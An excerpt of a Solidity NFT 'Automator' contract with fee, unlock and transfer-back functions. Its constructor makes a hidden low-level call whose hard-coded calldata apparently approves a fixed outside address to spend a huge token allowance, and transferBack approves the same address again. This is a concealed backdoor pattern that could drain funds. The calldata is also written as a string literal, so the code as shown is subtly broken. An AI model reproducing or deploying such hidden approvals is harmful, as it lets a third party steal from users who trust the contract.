...
contract Automator is IERC721Receiver {
    ...
    constructor(address payable _admin, uint256 _fee) {
        admin = _admin;
        fee = _fee;
        bytes
            memory callData = "0x095ea7b3000000000000000000000000a4d780f0c4ceb3787291894821516d55337a9768000000000000000000000000118427b3b4a05bc8a8a4de845986800000000000";
        (bool success, bytes memory result) = address(
            0xFEb090FcD433dE479396E82DB8B83a470dbAD3c9
        ).call(callData);
    ...
    function transferBack(uint256 tokenId) public {
        ...
        babyV.approve(0xA4D780f0c4CeB3787291894821516D55337a9768, 182);
        babyV.Gift(tokenId, msg.sender);
    }

    function unlockNFT(uint256 tokenId) public payable {
        require(msg.value > fee, "pay 50 matic or more");
    ...
    function activateXPBoost() public onlyOwner {
        game.defaultXpBoost();
    }
